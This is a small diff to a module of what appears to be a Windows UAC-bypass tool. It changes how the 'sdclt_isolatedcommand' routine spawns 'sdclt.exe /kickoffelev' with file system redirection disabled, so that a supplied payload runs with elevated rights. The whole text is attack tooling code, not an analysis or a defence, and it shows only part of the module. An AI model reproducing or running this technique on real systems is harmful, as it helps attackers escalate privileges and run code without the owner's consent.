@@ -12,7 +12,7 @@ sdcltisolatedcommand_info = {
 	"Works From": "10240",
 	"Admin": False,
 	"Function Name": "sdclt_isolatedcommand",
-	"Function Payload": True,
+	"Function Payload" : True,
 }
 
 
@@ -34,7 +34,7 @@ def sdclt_isolatedcommand(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if process().create("cmd.exe /c sdclt.exe /kickoffelev", 1):
+			if process().create("sdclt.exe", params="/kickoffelev"):
 				print_success("Successfully spawned process ({})".format(payload))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
